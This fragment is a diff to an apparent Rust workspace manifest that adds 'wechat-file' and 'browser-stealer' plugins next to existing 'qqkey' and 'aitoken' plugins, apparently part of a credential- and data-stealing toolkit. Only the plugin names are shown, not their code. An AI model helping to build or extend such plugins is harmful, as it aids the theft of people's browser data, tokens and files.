@@ -24,6 +24,8 @@ members = [
     "modules/forkexec",
     "plugins/qqkey",
     "plugins/aitoken",
+    "plugins/wechat-file",
+    "plugins/browser-stealer",
 ]
 resolver = "2"
 
